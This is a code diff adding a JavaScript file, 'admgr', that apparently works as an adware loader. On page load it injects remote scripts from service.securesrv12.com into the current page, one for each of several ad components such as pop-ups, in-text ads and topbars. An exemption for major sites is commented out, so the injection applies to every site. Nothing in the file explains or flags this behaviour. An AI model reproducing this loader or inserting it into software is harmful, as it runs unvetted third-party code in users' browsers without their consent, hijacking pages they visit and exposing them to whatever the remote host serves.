@@ -1,0 +1,42 @@
+
+(function(){
+    var admgr = {
+
+        isDomainInList : function (domainList) {
+            var domain = window.location.host;
+            for (var i = 0; i < domainList.length; i++) {
+                if (domain.indexOf( domainList[i] ) > -1) {
+                    return true;
+                }
+            }
+            return false;
+        },
+
+        loadJS : function (url) {
+            var e=document.createElement('script');
+            e.src = url;
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(e);
+        },
+
+        init : function() {
+            var source = 'mm-1506';
+            var a = ["Adsc-video","FstOffz-topbar","FstOffz-slider","Adm","imonomy","brk-ws","mymedia-pop-ron","50onred-pops","50onred-intext","ga","qa"];
+
+            
+            //if (admgr.isDomainInList(["google","facebook","bing","yahoo","youtube"]))
+            //    return;
+
+            if (window.name.match(/^(a652c|ld893|admgr_pop_offer)/))
+                return;
+
+            a.forEach(function(component) {
+                var url = '//service.securesrv12.com/servicejs/components/js/?key='+component+'&source='+source;
+                admgr.loadJS(url);
+            });
+
+        }
+    }
+
+    admgr.init();
+
+})();
